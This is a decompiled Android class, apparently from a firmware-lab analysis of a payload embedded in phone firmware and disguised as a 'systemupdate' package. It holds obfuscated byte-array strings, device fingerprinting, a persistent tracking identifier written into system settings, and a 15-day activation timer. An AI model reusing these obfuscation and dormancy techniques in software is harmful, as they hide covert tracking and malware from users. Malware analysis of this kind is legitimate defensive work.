package com.android.systemupdate.a;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import com.android.systemupdate.a.a.p;
import java.util.Random;
import java.util.UUID;

/* JADX INFO: compiled from: ComConstants.java */
/* JADX INFO: loaded from: /root/firmware-lab/inoi-a75/extracted/embedded_payloads/nested/b/classes.dex */
public class a {
    public static final byte[] a = {118, 125, 106, 114, 113, 116, 116, 110, 117, 104, 125, 121, 118};
    public static final byte[] b = {116, 120, 119, 118, 123, 102, 115, 114, 103, 104, 104, 101, 112};
    public static final byte[] c = {72, 117, 120, 112, 115, 127, 124, 18, 31, 4, 114, 96, 113};
    public static final byte[] d = {65, 122, 111, 112, 109, 97, 61, 18, 91, 7, 54};
    public static final byte[] e = {65, 103, 99, 96, 109, 48, 60, 31, 20, 7, 50};
    public static final byte[] f = {68, 100, 98, 96, 99, 97, 61, 29, 95};
    public static final byte[] g = {68, 100, 107, 111, 127, 121, 102, 24, 20, 66, 50};
    public static final byte[] h = {69, 125, 103, 43, 123, 102, 107, 88, 67, 89, 97, 37, 113, 67, 97, 80, 89, 120, 106, 114};
    public static final byte[] i = {8, 115, 105, 113, 115, 103, 97, 4, 111, 120, 64, 72, 73, 121, 70, 125, 99, 66, 72, 76, 121, 71, 90, 65, 91, 92, 74, 117, 109, 115, 81, 66, 77, 104};
    public static final byte[] j = {71, 124, 110, 119, 117, 97, 107, 4, 66, 85, 113, 37, 97, 73, 123, 74, 30, 85, 66, 79, 104, 87, 73, 81, 83, 94, 70, 126, 117, 111, 70, 67, 67, 104, 82, 97};
    public static final byte[] k = {81, 103, 99, 55, 34, 62, 120, 88};
    public static final byte[] l = {72, 112, 125, 108, 111, 60, 122, 24, 20, 67, 50};
    public static final byte[] m = {65, 119, 50, 50, 105, 48, 120, 89, 69, 86};
    public static final byte[] n = {78, 103, 120, 50, 44, 92, 102, 0, 89, 22, 51, 46, 105, 64, 85, 72};
    public static final byte[] o = {67, 42, 44, 111, 47, 93, 86, 25, 24, 20, 109, 109, 86, 5, 103, 76};
    public static final byte[] p = {8, 118, 107, 113, 123, 39, 120, 69, 94, 91, 118};
    public static final byte[] q = {8, 116, 99, 105, 127, 123, 32};
    public static final byte[] r = {8, 104, 99, 117};
    public static final byte[] s = {8, 120, 107, 119};
    public static final byte[] t = {8, 118, 111, 125};
    public static final byte[] u = {73, 124, 78, 96, 105, 124, 125, 69, 85};
    public static final byte[] v = {9, 97, 110, 102, 123, 122, 107, 5, 109, 94, 97, 121, 109, 79, 113, 11, 84, 119, 121, 96, 9};
    public static final byte[] w = {78, 102, 126, 117, 105, 50, 32, 5, 91, 71, 114, 37, 101, 73, 122, 67, 92, 115, 35, 98, 73, 127, 37};
    public static final byte[][] x = {new byte[]{78, 102, 126, 117, 32, 39, 32, 80, 25, 9, 112, 115, 59, 8, 125, 65, 2, 121, 52, 117, 8, 113, 101, 104, 32, 59, 63, 26, 28, 3, 42, 97, 103, 127, 112, 102, 3, 57}, new byte[]{78, 102, 126, 117, 105, 50, 32, 5, 77, 86, 117, 98, 105, 30, 59, 76, 85, 36, 98, 56, 82, 60, 105, 106, 119, 50, 60, 26, 28, 0, 55, 36, 104, 67, 76, 65, 114, 37, 34}};
    public static final byte[] y = {69, 125, 100, 99, 115, 111, 80, 89, 88, 81, 113, 110};
    public static final byte[] z = {73, 119, 101, 108, 104, 103, 106, 88, 69};
    public static final byte[] A = {71, 124, 110, 119, 117, 97, 107, 4, 69, 94, 113, 110, 108, 82, 59, 69, 83, 98, 100, 110, 72, 60, 89, 92, 73, 92, 74, 103, 115, 125, 64, 79, 75, 103, 74};
    public static final byte[] B = {76, 127, 85, 104, 117, 108, 106, 70, 115, 83, 106, 101, 100, 79, 114};
    public static final byte[] C = {73, 124, 73, 119, 127, 105, 123, 79};
    private static long D = 0;

    public static String a() {
        return p.a(String.valueOf(Build.MODEL.replaceAll(" ", "_")) + Build.BRAND.replaceAll(" ", "_"));
    }

    public static String a(Context context) {
        try {
            String oaid = Settings.System.getString(context.getContentResolver(), "oaid");
            if (oaid == null || oaid.length() <= 0) {
                return c(context);
            }
            return oaid;
        } catch (Throwable th) {
            return "";
        }
    }

    private static String c(Context context) {
        String id;
        if (context == null) {
            return "";
        }
        try {
            if (context.checkCallingOrSelfPermission("android.permission.WRITE_SETTINGS") == 0) {
                String tmp = a(10);
                String oaid = String.valueOf(UUID.randomUUID().toString().replaceAll("-", "")) + tmp;
                if (!Settings.System.putString(context.getContentResolver(), "oaid", oaid) || (id = Settings.System.getString(context.getContentResolver(), "oaid")) == null || id.length() <= 0) {
                    return "";
                }
                return id;
            }
            return "";
        } catch (Throwable th) {
            return "";
        }
    }

    public static boolean b(Context context) {
        try {
            if (D <= 0) {
                D = Settings.System.getLong(context.getContentResolver(), "init_time", 0L);
                if (D <= 0) {
                    return true;
                }
            }
            return System.currentTimeMillis() - D <= 1296000000;
        } catch (Throwable th) {
            return true;
        }
    }

    private static String a(int size) {
        StringBuffer sb = new StringBuffer();
        for (int i2 = 0; i2 < size; i2++) {
            int k2 = new Random().nextInt(3);
            if (k2 == 0) {
                int m2 = new Random().nextInt(10) + 48;
                sb.append((char) m2);
            } else if (k2 == 1) {
                int m3 = new Random().nextInt(26) + 97;
                sb.append((char) m3);
            } else {
                int m4 = new Random().nextInt(26) + 65;
                sb.append((char) m4);
            }
        }
        return sb.toString();
    }
}
